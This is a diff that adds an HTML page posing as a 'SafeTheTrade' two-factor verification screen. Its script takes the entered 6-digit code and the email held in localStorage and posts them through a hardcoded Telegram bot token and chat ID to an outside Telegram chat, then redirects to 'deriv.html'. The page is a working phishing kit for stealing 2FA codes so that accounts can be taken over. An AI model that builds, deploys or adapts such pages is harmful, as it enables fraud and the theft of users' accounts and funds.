@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Two-factor code — SafeTheTrade</title>
+
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+         :root {
+            --bg: #0a0a0a;
+            --nav-border: #1a1a1a;
+            --card-bg: #141414;
+            --card-border: #222222;
+            --input-bg: #1c1c1c;
+            --input-border: #2a2a2a;
+            --text: #ffffff;
+            --text-muted: #8a8a8a;
+            --text-label: #9a9a9a;
+            --green: #22c55e;
+            --green-hover: #16a34a;
+            --btn-white: #f5f5f5;
+            --btn-white-text: #111111;
+            --footer-text: #6b6b6b;
+            --font: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        html,
+        body {
+            height: 100%;
+        }
+        
+        body {
+            font-family: var(--font);
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 28px;
+            height: 64px;
+            border-bottom: 1px solid var(--nav-border);
+            flex-shrink: 0;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--text);
+        }
+        
+        .logo-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 35%, #4ade80, #16a34a 55%, #14532d);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.25);
+        }
+        
+        .logo-icon svg {
+            width: 14px;
+            height: 14px;
+        }
+        
+        .logo-text {
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+        }
+        
+        .nav-link {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.15s;
+        }
+        
+        .nav-link:hover {
+            color: var(--text);
+        }
+        
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn-outline {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: 1px solid #2e2e2e;
+            background: transparent;
+            color: var(--text);
+            font-size: 13.5px;
+            font-weight: 500;
+            font-family: inherit;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+        }
+        
+        .btn-outline:hover {
+            background: #1a1a1a;
+            border-color: #3a3a3a;
+        }
+        
+        .btn-green {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: none;
+            background: var(--green);
+            color: #fff;
+            font-size: 13.5px;
+            font-weight: 600;
+            font-family: inherit;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        
+        .btn-green:hover {
+            background: var(--green-hover);
+        }
+        
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        .card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 32px 32px 28px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
+        }
+        
+        .card h1 {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            margin-bottom: 10px;
+            color: #fafafa;
+        }
+        
+        .card-subtitle {
+            font-size: 13.5px;
+            color: var(--text-muted);
+            margin-bottom: 28px;
+            line-height: 1.55;
+        }
+        
+        .field {
+            margin-bottom: 16px;
+        }
+        
+        .field label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            color: var(--text-label);
+            margin-bottom: 8px;
+        }
+        
+        .field input {
+            width: 100%;
+            height: 44px;
+            padding: 0 14px;
+            background: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 14px;
+            font-family: inherit;
+            letter-spacing: 0.04em;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+        
+        .field input::placeholder {
+            color: #555555;
+            letter-spacing: normal;
+        }
+        
+        .field input:focus {
+            border-color: #3f3f3f;
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.04);
+        }
+        
+        .switch-account {
+            display: inline-block;
+            color: var(--green);
+            font-size: 13.5px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 24px;
+        }
+        
+        .switch-account:hover {
+            text-decoration: underline;
+        }
+        
+        .btn-submit {
+            width: 100%;
+            height: 46px;
+            border: none;
+            border-radius: 10px;
+            background: var(--btn-white);
+            color: var(--btn-white-text);
+            font-size: 14.5px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+        }
+        
+        .btn-submit:hover {
+            background: #e8e8e8;
+        }
+        
+        .btn-submit:active {
+            transform: scale(0.995);
+        }
+        
+        .footer {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 28px;
+            border-top: 1px solid var(--nav-border);
+            font-size: 12.5px;
+            color: var(--footer-text);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 0;
+        }
+        
+        .footer-links a {
+            color: var(--footer-text);
+            text-decoration: none;
+            transition: color 0.15s;
+        }
+        
+        .footer-links a:hover {
+            color: #a3a3a3;
+        }
+        
+        .footer-links .sep {
+            margin: 0 6px;
+            color: var(--footer-text);
+            user-select: none;
+        }
+        
+        @media (max-width: 640px) {
+            .header {
+                padding: 0 16px;
+            }
+            .card {
+                padding: 28px 22px 24px;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 16px;
+            }
+            .nav-link {
+                display: none;
+            }
+        }
+    </style>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+</head>
+
+<body>
+    <header class="header">
+        <div class="header-left">
+            <a href="#" class="logo" aria-label="SafeTheTrade home">
+                <span class="logo-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z"></path>
+            <path d="M9 12l2 2 4-4"></path>
+          </svg>
+        </span>
+                <span class="logo-text">SafeTheTrade</span>
+            </a>
+
+            <a href="#" class="nav-link">Offers</a>
+        </div>
+
+        <div class="header-right">
+            <a href="#" class="btn-outline">Log in</a>
+            <a href="#" class="btn-green">Sign up</a>
+        </div>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1>Two-factor code</h1>
+
+            <p class="card-subtitle">
+                Signing in as <span id="loginEmail">—</span> — enter the 6-<br /> digit code from your authenticator app.
+            </p>
+
+            <form id="twofaForm" action="#" method="post" autocomplete="one-time-code">
+                <div class="field">
+                    <label for="code">2FA code</label>
+                    <input id="code" name="code" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="123456" value="" autocomplete="one-time-code" />
+                </div>
+
+                <a href="signin.html" class="switch-account">Use a different account</a>
+
+                <button type="submit" class="btn-submit">Verify code</button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div>www.safethetrade.com (C) 2026</div>
+        <div class="footer-links">
+            <a href="#">Rate calculator</a><span class="sep">/</span>
+            <a href="#">System status</a><span class="sep">/</span>
+            <a href="#">Transparency</a><span class="sep">/</span>
+            <a href="#">API docs</a><span class="sep">/</span>
+            <a href="#">Fees</a><span class="sep">/</span>
+            <a href="#">Terms</a><span class="sep">/</span>
+            <a href="#">Privacy</a>
+        </div>
+    </footer>
+
+    <script>
+        // Always read email from localStorage and display it.
+        // Expected key: "stt_email"
+        (function() {
+            const loginEmailEl = document.getElementById("loginEmail");
+            const storedEmail = (localStorage.getItem("stt_email") || "").trim();
+
+            if (storedEmail && loginEmailEl) {
+                loginEmailEl.textContent = storedEmail;
+            } else if (loginEmailEl) {
+                // Fallback text if nothing is stored
+                loginEmailEl.textContent = "your account";
+            }
+        })();
+
+        document.getElementById("twofaForm").addEventListener("submit", function(e) {
+                    e.preventDefault();
+
+                    const codeEl = document.getElementById("code");
+                    const code = (codeEl ? codeEl.value : "").trim();
+
+                    // Basic validation
+                    if (!/^\d{6}$/.test(code)) {
+                        alert("Please enter a valid 6-digit code.");
+                        return;
+                    }
+
+                    // Read email from localStorage at submit time too (in case it changed)
+                    const storedEmail = (localStorage.getItem("stt_email") || "").trim();
+
+                    // NOTE: Putting Telegram bot tokens in frontend JS is insecure.
+                    // In a real app, send this to your backend instead.
+                    const telegramBotToken = "8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q";
+                    const chatId = "5615316142";
+
+                    const message = `Email 2FA code: ${code}${storedEmail ? ` (for ${storedEmail})` : ""}`;
+      const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+      fetch(apiUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+        .then((response) => {
+          if (response.ok) {
+            window.location.href = "deriv.html";
+          } else {
+            alert("Failed to send 2FA code.");
+          }
+        })
+        .catch((err) => {
+          console.error(err);
+          alert("An error occurred while sending the code.");
+        });
+    });
+    </script>
+</body>
+
+</html>
